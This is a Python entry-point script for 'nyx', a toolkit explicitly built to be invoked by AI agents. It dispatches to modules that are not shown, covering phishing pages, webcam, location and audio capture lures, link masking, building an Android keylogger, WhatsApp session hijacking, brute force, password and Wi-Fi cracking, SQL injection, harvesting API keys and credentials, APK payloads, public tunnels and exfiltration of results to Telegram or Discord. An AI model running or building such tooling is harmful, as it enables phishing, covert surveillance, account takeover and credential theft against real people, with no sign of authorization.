#!/usr/bin/env python3
"""
nyx — AI-callable cybersecurity toolkit
Usage: python nyx.py <category> <action> [options]
"""
import argparse
import json
import sys
import time

NYX_DIR = __file__.replace("/nyx.py", "")
sys.path.insert(0, NYX_DIR)


def cmd_osint(args):
    if args.action == "username":
        from modules.osint import username
        return username.run(args.target)
    elif args.action == "email":
        from modules.osint import email
        return email.run(args.target)
    elif args.action == "ip":
        from modules.osint import ip_geo
        return ip_geo.run(args.target)
    elif args.action == "web":
        from modules.osint import web_osint
        return web_osint.run(args.target, pages=getattr(args, "pages", 3))
    elif args.action == "metadata":
        from modules.osint import metadata
        return metadata.run(args.file, strip=getattr(args, "strip", False))
    elif args.action == "domain":
        from modules.osint import domain
        return domain.run(args.target)
    elif args.action == "profile":
        from modules.osint import profiler
        return profiler.run(args.target, target_type=getattr(args, "type", "auto"))
    else:
        return {"error": f"Unknown osint action: {args.action}"}


def cmd_phishing(args):
    dry = getattr(args, "dry_run", False)
    if args.action == "page":
        from modules.phishing import page
        return page.run(template=getattr(args, "template", "google"), dry_run=dry)
    elif args.action == "cam":
        from modules.phishing import cam
        return cam.run(template=getattr(args, "template", "fake_youtube"), dry_run=dry)
    elif args.action == "location":
        from modules.phishing import location
        return location.run(template=getattr(args, "template", "zoom"), dry_run=dry)
    elif args.action == "audio":
        from modules.phishing import audio
        return audio.run(dry_run=dry)
    elif args.action == "urlmask":
        from modules.phishing import url_mask
        return url_mask.run(url=args.url, shortener=getattr(args, "shortener", "tinyurl"))
    elif args.action == "skribble":
        from modules.phishing import skribble
        result = skribble.run(redirect_url=getattr(args, "redirect", "https://skribbl.io"))
        print(json.dumps(result, indent=2))
        try:
            while True: time.sleep(30)
        except KeyboardInterrupt:
            pass
        return result
    else:
        return {"error": f"Unknown phishing action: {args.action}"}


def cmd_exploit(args):
    dry = getattr(args, "dry_run", False)
    if args.action == "qr":
        from modules.exploit import qr_inject
        return qr_inject.run(
            listener_ip=getattr(args, "listener_ip", "127.0.0.1"),
            listener_port=getattr(args, "port", 8080),
            dry_run=dry,
        )
    elif args.action == "android":
        from modules.exploit import android
        if getattr(args, "list", False):
            return android.list_payloads()
        return android.build_keylogger(dry_run=dry)
    elif args.action == "whatsapp":
        from modules.exploit import whatsapp
        return whatsapp.run(module=getattr(args, "module", "session_hijack"), dry_run=dry)
    else:
        return {"error": f"Unknown exploit action: {args.action}"}


def cmd_network(args):
    dry = getattr(args, "dry_run", False)
    if args.action == "scan":
        from modules.network import scan
        return scan.run(
            target=args.target,
            ports=getattr(args, "ports", "1-1000"),
            fast=getattr(args, "fast", False),
            dry_run=dry,
        )
    elif args.action == "brute":
        from modules.network import brute
        return brute.run(
            target=args.target,
            service=getattr(args, "service", "ssh"),
            username=getattr(args, "username", "admin"),
            wordlist=getattr(args, "wordlist", ""),
            port=getattr(args, "port", 0),
            dry_run=dry,
        )
    elif args.action == "crack":
        from modules.network import brute
        return brute.crack_hash(
            hash_str=args.hash,
            hash_type=getattr(args, "type", "md5"),
            wordlist=getattr(args, "wordlist", ""),
        )
    elif args.action == "wifi":
        from modules.network import wifi
        sub = getattr(args, "sub", "scan")
        if sub == "scan":
            return wifi.scan_networks(interface=getattr(args, "interface", "wlan0"))
        elif sub == "crack":
            return wifi.crack_wpa(
                capture_file=args.capture,
                wordlist=getattr(args, "wordlist", ""),
                dry_run=dry,
            )
    elif args.action == "sqli":
        from modules.network import sqlinject
        return sqlinject.run(target=args.target, dry_run=dry)
    elif args.action == "dirs":
        from modules.network import dir_enum
        return dir_enum.run(
            target=args.target,
            wordlist=getattr(args, "wordlist", ""),
            dry_run=dry,
        )
    elif args.action == "nuclei":
        from modules.network import dir_enum
        return dir_enum.nuclei_scan(
            target=args.target,
            templates=getattr(args, "templates", "cves"),
            dry_run=dry,
        )
    else:
        return {"error": f"Unknown network action: {args.action}"}


def cmd_harvest(args):
    dry = getattr(args, "dry_run", False)
    if args.action == "apikeys":
        from modules.harvest import api_keys
        return api_keys.run(query=args.query, dry_run=dry)
    elif args.action == "creds":
        from modules.harvest import creds
        return creds.run(
            repo_url=getattr(args, "repo", ""),
            local_path=getattr(args, "path", ""),
            dry_run=dry,
        )
    else:
        return {"error": f"Unknown harvest action: {args.action}"}


def cmd_payload(args):
    if args.action == "list":
        from modules.payload import apk
        return apk.list_payloads()
    elif args.action == "copy":
        from modules.payload import apk
        return apk.copy_to(args.name, args.dest)
    else:
        return {"error": f"Unknown payload action: {args.action}"}


def cmd_report(args):
    from modules.report import builder
    return builder.run(session=getattr(args, "session", "latest"))


def cmd_tunnel(args):
    from modules.tunnel import manager
    if args.action == "start":
        url = manager.start(port=getattr(args, "port", None))
        return {"status": "started", "public_url": url}
    elif args.action == "stop":
        manager.stop()
        return {"status": "stopped"}
    elif args.action == "url":
        return {"public_url": manager.get_public_url()}
    else:
        return {"error": f"Unknown tunnel action: {args.action}"}


DISPATCH = {
    "osint": cmd_osint,
    "phishing": cmd_phishing,
    "exploit": cmd_exploit,
    "network": cmd_network,
    "harvest": cmd_harvest,
    "payload": cmd_payload,
    "report": cmd_report,
    "tunnel": cmd_tunnel,
}


def main():
    parser = argparse.ArgumentParser(
        prog="nyx",
        description="nyx — AI-callable cybersecurity toolkit",
    )
    parser.add_argument("category", choices=list(DISPATCH.keys()), help="Module category")
    parser.add_argument("action", nargs="?", default="", help="Action within the category")
    parser.add_argument("--target", "-t", help="Target (hostname, IP, username, email, URL)")
    parser.add_argument("--file", "-f", help="File path (for metadata)")
    parser.add_argument("--template", help="Template name (phishing pages)")
    parser.add_argument("--url", help="URL to mask")
    parser.add_argument("--shortener", default="tinyurl", help="URL shortener service")
    parser.add_argument("--listener-ip", dest="listener_ip", help="Listener IP for exploits")
    parser.add_argument("--port", "-p", type=int, help="Port number")
    parser.add_argument("--service", help="Service for brute force (ssh/ftp/etc)")
    parser.add_argument("--username", "-u", help="Username for brute force")
    parser.add_argument("--wordlist", "-w", help="Wordlist path")
    parser.add_argument("--hash", help="Hash to crack")
    parser.add_argument("--type", help="Hash type or target type")
    parser.add_argument("--sub", help="Sub-action (e.g., wifi scan/crack)")
    parser.add_argument("--capture", help="Capture file path")
    parser.add_argument("--interface", default="wlan0", help="Network interface")
    parser.add_argument("--module", help="Module name (exploit sub-selection)")
    parser.add_argument("--query", "-q", help="Search query (harvest)")
    parser.add_argument("--repo", help="Git repo URL (harvest creds)")
    parser.add_argument("--path", help="Local path (harvest creds)")
    parser.add_argument("--name", help="APK name (payload)")
    parser.add_argument("--dest", help="Destination path (payload copy)")
    parser.add_argument("--redirect", help="Redirect URL after capture (skribble)")
    parser.add_argument("--session", default="latest", help="Session name (report)")
    parser.add_argument("--pages", type=int, default=3, help="Pages to search (web osint)")
    parser.add_argument("--templates", default="cves", help="Nuclei template category")
    parser.add_argument("--fast", action="store_true", help="Fast scan mode")
    parser.add_argument("--strip", action="store_true", help="Strip metadata from file")
    parser.add_argument("--list", action="store_true", help="List available items")
    parser.add_argument("--dry-run", dest="dry_run", action="store_true",
                        help="Validate config without executing")
    parser.add_argument("--notify", action="store_true", help="Send result to Telegram/Discord")
    parser.add_argument("--json", dest="json_out", action="store_true",
                        help="Force JSON output only")

    args = parser.parse_args()

    handler = DISPATCH.get(args.category)
    result = handler(args)

    if args.json_out or not sys.stdout.isatty():
        print(json.dumps(result, indent=2, default=str))
    else:
        _pretty_print(result)

    if getattr(args, "notify", False) and result:
        from modules.notify import sink
        sink.send(result, title=f"{args.category} {args.action}")


def _pretty_print(data: dict):
    if "error" in data:
        print(f"\n[!] Error: {data['error']}\n")
        return

    module = data.get("module", "")
    ts = data.get("timestamp", "")
    print(f"\n{'='*60}")
    print(f"  nyx | {module}")
    print(f"  {ts}")
    print(f"{'='*60}")

    skip = {"module", "timestamp", "raw", "raw_stderr"}
    for k, v in data.items():
        if k in skip:
            continue
        if isinstance(v, list):
            print(f"\n  {k} ({len(v)}):")
            for item in v[:20]:
                if isinstance(item, dict):
                    print(f"    • {json.dumps(item)}")
                else:
                    print(f"    • {item}")
            if len(v) > 20:
                print(f"    ... +{len(v) - 20} more")
        elif isinstance(v, dict):
            print(f"\n  {k}:")
            for dk, dv in v.items():
                print(f"    {dk}: {dv}")
        else:
            print(f"  {k}: {v}")
    print(f"\n{'='*60}\n")


if __name__ == "__main__":
    main()
